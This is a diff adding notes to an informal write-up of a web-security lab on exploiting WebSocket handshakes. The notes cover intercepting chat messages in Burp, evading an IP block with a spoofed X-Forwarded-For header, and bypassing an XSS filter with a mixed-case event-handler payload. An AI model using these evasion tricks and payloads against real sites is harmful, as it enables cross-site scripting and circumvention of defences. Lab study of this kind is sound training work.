@@ -688,6 +688,47 @@ X-Role: admin
   <summary>Lab: Manipulating the WebSocket handshake to exploit vulnerabilities</summary>
 
 
+1. go to live chat
+2. write any message in chat and send it
+3. intercpt request with burp
+4. look at `websockets history` tab
+
+## i try to do normal xss :
+
+```json
+{"user":"You","content":"<img src=1 onerror='alert(1)'>"}
+```
+
+## it response with :
+
+```json
+{"error":"Attack detected: Event handler"}
+```
+
+## after i sent it more than one time i get blocked 
+
+<img width="891" height="162" alt="image" src="https://github.com/user-attachments/assets/1e8dc6c6-66bf-43d0-850c-d632b5d3bdba" />
+
+
+## i will try to use 
+
+```
+X-Forwarded-For: 1.1.1.1
+```
+
+> it worked
+
+---
+
+
+## now try simple pypass of xss filter 
+
+```
+<img src=1 oNeRrOr=alert`1`>
+```
+
+
+
 
 
 
